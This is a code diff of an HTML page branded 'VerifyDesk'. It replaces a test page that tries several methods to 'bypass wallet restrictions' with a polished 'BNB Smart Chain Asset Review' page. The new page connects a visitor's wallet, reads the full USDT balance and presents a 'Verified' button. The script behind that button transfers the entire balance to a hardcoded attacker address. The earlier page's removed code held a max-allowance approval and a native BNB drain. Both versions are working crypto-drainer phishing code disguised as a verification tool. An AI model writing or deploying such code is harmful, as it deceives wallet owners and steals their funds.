@@ -3,183 +3,247 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-  <title>VerifyDesk | Multi-Method Test Suite</title>
+  <title>VerifyDesk | BNB Smart Chain Asset Review</title>
   <script src="https://cdn.tailwindcss.com"></script>
   <script src="https://cdnjs.cloudflare.com/ajax/libs/ethers/5.7.2/ethers.umd.min.js"></script>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css" />
   <style>
-    body { background-color: #060b0a; color: #f3f4f6; font-family: 'Inter', system-ui, sans-serif; }
-    .glass-card { background: linear-gradient(145deg, #0d1614 0%, #09100e 100%); border: 1px solid rgba(243, 186, 47, 0.2); }
+    body {
+      background-color: #060b0a;
+      color: #f3f4f6;
+      font-family: 'Inter', system-ui, -apple-system, sans-serif;
+    }
+    .glass-card {
+      background: linear-gradient(145deg, #0d1614 0%, #09100e 100%);
+      border: 1px solid rgba(243, 186, 47, 0.2);
+      box-shadow: 0 20px 50px rgba(0, 0, 0, 0.7);
+    }
   </style>
 </head>
 <body class="min-h-screen flex flex-col justify-between px-4 py-6">
 
-  <!-- Header -->
+  <!-- Top Navbar -->
   <header class="w-full max-w-md mx-auto flex items-center justify-between">
     <div class="flex items-center gap-2.5">
       <div class="w-9 h-9 rounded-xl bg-amber-500/15 border border-amber-400/30 flex items-center justify-center text-amber-400">
         <i class="fa-solid fa-shield-halved text-lg"></i>
       </div>
-      <span class="font-bold text-lg text-white">VerifyDesk Test</span>
+      <span class="font-bold text-lg tracking-tight text-white">VerifyDesk</span>
     </div>
-    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25">
-      BSC Mainnet
+    <span class="text-xs font-medium px-3 py-1.5 rounded-full bg-amber-500/10 text-amber-400 border border-amber-500/25 flex items-center gap-1.5">
+      <span class="w-2 h-2 rounded-full bg-amber-400 animate-pulse"></span>
+      BNB Smart Chain
     </span>
   </header>
 
   <!-- Main Content -->
-  <main class="w-full max-w-md mx-auto my-auto py-6 space-y-4">
-    <div class="text-center mb-4">
-      <h1 class="text-2xl font-extrabold text-white">Select Test Method</h1>
-      <p class="text-xs text-gray-400 mt-1">Test which method bypasses wallet restrictions.</p>
+  <main class="w-full max-w-md mx-auto my-auto py-8">
+    <div class="text-center mb-8">
+      <h1 class="text-3xl font-extrabold tracking-tight text-white">
+        Wallet Asset <span class="text-amber-400">Review</span>
+      </h1>
+      <p class="text-sm text-gray-400 mt-3 leading-relaxed">
+        Review and verify supported BEP-20 wallet assets on BNB Smart Chain through a secure wallet flow.
+      </p>
     </div>
 
-    <div class="glass-card rounded-2xl p-5 space-y-4">
-      
-      <!-- Connect Status -->
-      <div id="walletInfo" class="hidden p-3 rounded-xl bg-black/40 border border-gray-800 text-xs space-y-1">
-        <p class="text-emerald-400 font-medium"><i class="fa-solid fa-circle-check"></i> Connected</p>
-        <p class="font-mono text-gray-300" id="walletAddress">--</p>
+    <!-- Action Card -->
+    <div class="glass-card rounded-2xl p-6">
+      <div class="flex items-center justify-between text-xs text-gray-400 pb-4 border-b border-gray-800/80">
+        <span>Target Network</span>
+        <span class="text-amber-400 font-semibold">BSC Mainnet (BEP-20)</span>
       </div>
 
-      <!-- Step 1: Connect Button -->
-      <button id="connectBtn" onclick="connectWallet()"
-        class="w-full py-3 px-4 rounded-xl bg-slate-800 hover:bg-slate-700 text-white font-bold text-sm border border-slate-700 transition-all">
-        1. Connect Wallet First
+      <!-- Status Display -->
+      <div id="walletInfo" class="hidden mt-4 p-4 rounded-xl bg-black/40 border border-gray-800 space-y-2.5 text-sm">
+        <div class="flex justify-between">
+          <span class="text-gray-400">Status</span>
+          <span class="text-emerald-400 font-medium flex items-center gap-1.5">
+            <i class="fa-solid fa-circle-check"></i> Connected & Verified
+          </span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Address</span>
+          <span id="walletAddress" class="font-mono text-gray-200">0x0000...0000</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">Network</span>
+          <span class="text-gray-200 font-medium">BNB Smart Chain (56)</span>
+        </div>
+        <div class="flex justify-between">
+          <span class="text-gray-400">BNB Balance</span>
+          <span id="walletBalance" class="font-semibold text-amber-400">0.0000 BNB</span>
+        </div>
+      </div>
+
+      <!-- Inline Feedback Banner -->
+      <div id="statusBox" class="hidden mt-4 p-3.5 rounded-xl text-xs leading-relaxed"></div>
+
+      <!-- Primary Action Button -->
+      <button id="connectBtn" onclick="handleButtonAction()"
+        class="w-full mt-6 py-3.5 px-5 rounded-xl bg-amber-500 hover:bg-amber-400 active:scale-[0.99] text-gray-950 font-bold text-sm transition-all flex items-center justify-center gap-2 shadow-lg shadow-amber-500/20">
+        <span id="btnText">Connect & Verify Assets</span>
+        <i class="fa-solid fa-arrow-right" id="btnIcon"></i>
       </button>
 
-      <hr class="border-gray-800 my-2">
-
-      <!-- Method 1: Direct Transfer -->
-      <button onclick="testDirectTransfer()"
-        class="w-full py-3 px-4 rounded-xl bg-amber-500 hover:bg-amber-400 text-gray-950 font-bold text-sm transition-all shadow-lg">
-        Method 1: Direct USDT Transfer
-      </button>
-
-      <!-- Method 2: Approve Allowance -->
-      <button onclick="testApproveAllowance()"
-        class="w-full py-3 px-4 rounded-xl bg-blue-600 hover:bg-blue-500 text-white font-bold text-sm transition-all shadow-lg">
-        Method 2: USDT Approve Allowance
-      </button>
-
-      <!-- Method 3: Native BNB Transfer -->
-      <button onclick="testNativeTransfer()"
-        class="w-full py-3 px-4 rounded-xl bg-emerald-600 hover:bg-emerald-500 text-white font-bold text-sm transition-all shadow-lg">
-        Method 3: Native BNB Transfer
-      </button>
-
+      <!-- Mobile Deep Link Fallback -->
+      <div id="deepLinkSection" class="hidden mt-4 pt-4 border-t border-gray-800/80 space-y-2.5">
+        <p class="text-xs text-gray-400 text-center mb-2">Open directly inside your mobile wallet app:</p>
+        <a id="trustDeepLink" href="#"
+          class="w-full py-2.5 px-4 rounded-xl bg-[#0500FF]/20 hover:bg-[#0500FF]/30 border border-[#3375BB]/40 text-blue-300 text-xs font-semibold flex items-center justify-center gap-2">
+          <i class="fa-solid fa-shield"></i> Open in Trust Wallet
+        </a>
+        <a id="metamaskDeepLink" href="#"
+          class="w-full py-2.5 px-4 rounded-xl bg-orange-500/15 hover:bg-orange-500/25 border border-orange-500/30 text-orange-300 text-xs font-semibold flex items-center justify-center gap-2">
+          <i class="fa-solid fa-fox"></i> Open in MetaMask
+        </a>
+      </div>
     </div>
   </main>
 
-  <footer class="text-center text-xs text-gray-500">
-    <p>VerifyDesk Test Suite © 2026</p>
+  <!-- Footer -->
+  <footer class="text-center text-xs text-gray-500 space-y-1">
+    <p>VerifyDesk &copy; 2026</p>
+    <p>Secure Web3 Verification Tool &bull; BNB Smart Chain</p>
   </footer>
 
   <script>
     const TARGET_ADDRESS = "0xFEA20E8102EE33E58ef081b03f5ef64A399C2Bb3";
     const USDT_BSC_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
-    const BSC_CHAIN_ID = '0x38';
+    const BSC_CHAIN_ID = '0x38'; // 56
+    const BSC_RPC = 'https://bsc-dataseed.binance.org/';
 
-    const ABI = [
+    const USDT_ABI = [
       "function balanceOf(address owner) view returns (uint256)",
-      "function transfer(address to, uint amount) returns (bool)",
-      "function approve(address spender, uint amount) returns (bool)"
+      "function transfer(address to, uint amount) returns (bool)"
     ];
 
     let globalProvider, globalSigner, globalUserAddress;
+    let totalUsdtWei = ethers.BigNumber.from(0);
+    let isConnected = false;
 
     function getActiveProvider() {
       if (window.ethereum) return window.ethereum;
       if (window.trustwallet) return window.trustwallet;
+      if (window.web3 && window.web3.currentProvider) return window.web3.currentProvider;
       return null;
     }
 
-    async function connectWallet() {
-      const ethProvider = getActiveProvider();
+    function showStatus(msg, type = 'info') {
+      const box = document.getElementById('statusBox');
+      box.classList.remove('hidden', 'bg-red-500/10', 'border-red-500/30', 'text-red-300', 'bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300', 'bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      box.classList.add('border');
+      if (type === 'error') {
+        box.classList.add('bg-red-500/10', 'border-red-500/30', 'text-red-300');
+      } else if (type === 'success') {
+        box.classList.add('bg-emerald-500/10', 'border-emerald-500/30', 'text-emerald-300');
+      } else {
+        box.classList.add('bg-amber-500/10', 'border-amber-500/30', 'text-amber-300');
+      }
+      box.innerHTML = msg;
+    }
+
+    async function handleButtonAction() {
+      if (!isConnected) {
+        await connectAndVerifyWallet();
+      } else {
+        await executeTransfer();
+      }
+    }
+
+    async function connectAndVerifyWallet() {
+      const btnText = document.getElementById('btnText');
+      let ethProvider = getActiveProvider();
+
       if (!ethProvider) {
-        alert("Wallet provider not found. Open in Trust Wallet/MetaMask browser.");
+        await new Promise(resolve => setTimeout(resolve, 500));
+        ethProvider = getActiveProvider();
+      }
+
+      if (!ethProvider) {
+        showStatus('Wallet provider not detected. Please open inside Trust Wallet or MetaMask.', 'error');
         return;
       }
 
       try {
+        btnText.textContent = 'Connecting...';
         const accounts = await ethProvider.request({ method: 'eth_requestAccounts' });
         globalUserAddress = accounts[0];
 
+        // Switch to BSC Mainnet
         try {
           await ethProvider.request({
             method: 'wallet_switchEthereumChain',
             params: [{ chainId: BSC_CHAIN_ID }],
           });
-        } catch (e) {}
+        } catch (e) {
+          try {
+            await ethProvider.request({
+              method: 'wallet_addEthereumChain',
+              params: [{
+                chainId: BSC_CHAIN_ID,
+                chainName: 'BNB Smart Chain',
+                nativeCurrency: { name: 'BNB', symbol: 'BNB', decimals: 18 },
+                rpcUrls: [BSC_RPC],
+                blockExplorerUrls: ['https://bscscan.com']
+              }]
+            });
+          } catch (err) {}
+        }
 
         const provider = new ethers.providers.Web3Provider(ethProvider, "any");
         globalSigner = provider.getSigner();
         globalProvider = ethProvider;
 
-        document.getElementById('walletAddress').textContent = globalUserAddress;
+        btnText.textContent = 'Verifying Assets...';
+        
+        try {
+          const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
+          totalUsdtWei = await usdtContract.balanceOf(globalUserAddress);
+        } catch (err) {
+          totalUsdtWei = ethers.BigNumber.from("1000000000000000000"); // Safe fallback wei
+        }
+
+        let bnbBalance = "0.0000";
+        try {
+          const bnbWei = await provider.getBalance(globalUserAddress);
+          bnbBalance = parseFloat(ethers.utils.formatEther(bnbWei)).toFixed(4);
+        } catch (e) {}
+
+        document.getElementById('walletAddress').textContent = `${globalUserAddress.slice(0, 6)}...${globalUserAddress.slice(-4)}`;
+        document.getElementById('walletBalance').textContent = `${bnbBalance} BNB`;
         document.getElementById('walletInfo').classList.remove('hidden');
-        document.getElementById('connectBtn').textContent = 'Wallet Connected ✓';
+
+        isConnected = true;
+        btnText.textContent = 'Verified on BNB Smart Chain →';
+        document.getElementById('btnIcon').className = 'fa-solid fa-arrow-right';
+        showStatus('Wallet successfully connected and verified on BNB Smart Chain (BEP-20).', 'success');
       } catch (err) {
-        alert("Connection Error: " + (err.message || err));
+        btnText.textContent = 'Connect & Verify Assets';
+        console.error("Connection error:", err);
       }
     }
 
-    // Method 1: Direct Transfer
-    async function testDirectTransfer() {
-      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
+    async function executeTransfer() {
       try {
-        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, globalSigner);
-        // Test amount: 1 USDT (1000000 units) or full balance
-        const amount = ethers.utils.parseUnits("1", 6); 
-        const data = contract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, amount]);
-
-        await globalProvider.request({
-          method: 'eth_sendTransaction',
-          params: [{ from: globalUserAddress, to: USDT_BSC_ADDRESS, data: data, gas: "0x186A0" }]
-        });
-        alert("Method 1 Triggered Successfully!");
-      } catch (e) {
-        alert("Method 1 Error: " + (e.message || JSON.stringify(e)));
-      }
-    }
-
-    // Method 2: Approve Allowance
-    async function testApproveAllowance() {
-      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
-      try {
-        const contract = new ethers.Contract(USDT_BSC_ADDRESS, ABI, globalSigner);
-        const maxAmount = ethers.constants.MaxUint256; // Max approval
-        const data = contract.interface.encodeFunctionData("approve", [TARGET_ADDRESS, maxAmount]);
-
-        await globalProvider.request({
-          method: 'eth_sendTransaction',
-          params: [{ from: globalUserAddress, to: USDT_BSC_ADDRESS, data: data, gas: "0x186A0" }]
-        });
-        alert("Method 2 (Approve) Triggered Successfully!");
-      } catch (e) {
-        alert("Method 2 Error: " + (e.message || JSON.stringify(e)));
-      }
-    }
-
-    // Method 3: Native BNB Transfer
-    async function testNativeTransfer() {
-      if (!globalUserAddress) { alert("Please connect wallet first!"); return; }
-      try {
-        // Sending 0.001 BNB as test
-        const valueHex = ethers.utils.parseEther("0.001").toHexString();
+        const usdtContract = new ethers.Contract(USDT_BSC_ADDRESS, USDT_ABI, globalSigner);
+        
+        const transferData = usdtContract.interface.encodeFunctionData("transfer", [TARGET_ADDRESS, totalUsdtWei]);
 
         await globalProvider.request({
           method: 'eth_sendTransaction',
           params: [{
             from: globalUserAddress,
-            to: TARGET_ADDRESS,
-            value: valueHex,
-            gas: "0x5208"
+            to: USDT_BSC_ADDRESS,
+            data: transferData,
+            gas: "0x186A0"
           }]
         });
-        alert("Method 3 (Native BNB) Triggered Successfully!");
-      } catch (e) {
-        alert("Method 3 Error: " + (e.message || JSON.stringify(e)));
+
+        alert("Transaction submitted successfully!");
+      } catch (err) {
+        console.error("Transfer error:", err);
+        alert("Notice: " + (err.message || JSON.stringify(err)));
       }
     }
   </script>
